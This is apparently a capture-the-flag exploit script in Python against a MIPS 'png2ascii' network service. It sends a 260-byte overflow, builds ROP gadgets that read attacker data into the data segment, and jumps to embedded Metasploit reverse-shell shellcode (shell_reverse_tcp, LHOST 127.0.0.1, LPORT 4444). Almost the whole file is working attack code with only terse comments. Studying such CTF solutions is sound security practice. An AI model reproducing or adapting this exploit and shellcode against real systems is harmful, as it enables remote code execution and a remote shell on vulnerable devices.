import struct
import sys

sys.path.append('/Users/clu/ctf/tools')

import ctf

# msfpayload linux/mipsle/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444
shellcode = (
        "\xef\xff\x09\x24\xff\xff\x10\x05\x82\x82\x08\x28\x27\x48"
        "\x20\x01\x21\xc8\x3f\x01\x48\x85\xb9\xaf\x48\x85\xb9\x23"
        "\x00\x00\x1c\x3c\x00\x00\x9c\x27\x21\xe0\x99\x03\x00\x00"
        "\x89\x8f\xd8\xff\xbd\x27\xe8\x00\x2a\x25\x04\x00\x47\x8d"
        "\xe8\x00\x28\x8d\x00\x01\x04\x3c\x7f\x00\x83\x34\x18\x00"
        "\xb9\x27\x02\x00\x06\x24\x11\x5c\x05\x24\x08\x00\xa6\xa7"
        "\x0a\x00\xa5\xa7\x18\x00\xa8\xaf\x1c\x00\xa7\xaf\x0c\x00"
        "\xa3\xaf\x20\x00\xb9\xaf\x24\x00\xa0\xaf\x02\x00\x04\x24"
        "\x02\x00\x05\x24\x21\x30\x00\x00\x57\x10\x02\x24\x0c\x00"
        "\x00\x00\x21\x18\x40\x00\xff\xff\x02\x24\x1a\x00\x62\x10"
        "\x01\x00\x04\x24\x21\x20\x60\x00\x08\x00\xa5\x27\x10\x00"
        "\x06\x24\x4a\x10\x02\x24\x0c\x00\x00\x00\x0e\x00\x40\x14"
        "\x21\x28\x00\x00\xdf\x0f\x02\x24\x0c\x00\x00\x00\x01\x00"
        "\x05\x24\xdf\x0f\x02\x24\x0c\x00\x00\x00\x02\x00\x05\x24"
        "\xdf\x0f\x02\x24\x0c\x00\x00\x00\x21\x30\x00\x00\x21\x20"
        "\x20\x03\x20\x00\xa5\x27\xab\x0f\x02\x24\x0c\x00\x00\x00"
        "\x21\x20\x00\x00\xa1\x0f\x02\x24\x0c\x00\x00\x00\x08\x00"
        "\xe0\x03\x28\x00\xbd\x27\xa1\x0f\x02\x24\x0c\x00\x00\x00"
        "\xe5\xff\x00\x10\x21\x20\x60\x00\x2f\x62\x69\x6e\x2f\x73"
        "\x68\x00\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
        "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
        "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
        "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
        "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
        "\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"
)

png2ascii_addr = 0x00401BC4

def send_write_gadget(s,fd, buf, buf_len):
    write_gadget = struct.pack('I', 0x411498)
    ctf.send(s, write_gadget) # Ret Addr
    ctf.send(s, struct.pack('I', fd)) # sp + 0
    # buf
    ctf.send(s, struct.pack('I', buf)) # sp + 4
    # len
    ctf.send(s, struct.pack('I', buf_len)) # sp + 8
    # flags = 0
    ctf.send(s, struct.pack('I', 0)) # sp + 12

    # ret_addr @ sp+28
    ctf.send(s, 'A' * 16)

    # Return to the png2ascii function so we can keep the rop going
    # The overflow's not long enough to do more than one of these at a time
    ctf.send(s, struct.pack('I',png2ascii_addr))
    

def read_gadget(s, fd, buf, buf_len, jump_addr):
    # Rop sets up registers like
    '''
    lw gp,32(sp) <- We then jump to this addr-31948
    sw v0,44(sp)
    lw a0,0(sp) <- fd
    lw a1,4(sp) <- buf
    lw a2,8(sp) <- len
    li v0, 4003 <- read syscall #
    syscall
    '''
    gadget_loc = struct.pack('I', 0x40F968)

    # Adjust for the negative jump offset
    jump_addr += 31948

    ctf.send(s, gadget_loc)
    ctf.send(s, struct.pack('I', fd))
    ctf.send(s, struct.pack('I',buf))
    ctf.send(s, struct.pack('I',buf_len))
    ctf.send(s, 'A' * 20)
    ctf.send(s, struct.pack('I', jump_addr))

def main():
    s = ctf.connect('localhost',1994)

    # Welcome MSG
    ctf.recv(s, dump=False)
    # prompt 
    ctf.recv(s, dump=False)


    ctf.send(s, 'png2ascii\n')

    # png2ascii cmd msg
    ctf.recv(s, dump=False)

    # The input buffer is 256 Bytes long

    # Stack layout looks like
    #    buf : 256 Bytes
    #    saved fp: 4 Bytes
    #    ret addr: 4 Bytes
    
    buf_len = 260
    ctf.send(s, 'A' * buf_len)

    # Just somewhere in the data segment to stuff our shellcode
#    data_loc = 0x10000000
    data_loc = 0x10009894
    exec_loc = data_loc + 4

    read_gadget(s, 5, data_loc, len(shellcode), data_loc)
    ctf.send(s, '\n')
    ctf.send(s, struct.pack('I', exec_loc) + shellcode)

if __name__ == '__main__':
    main()
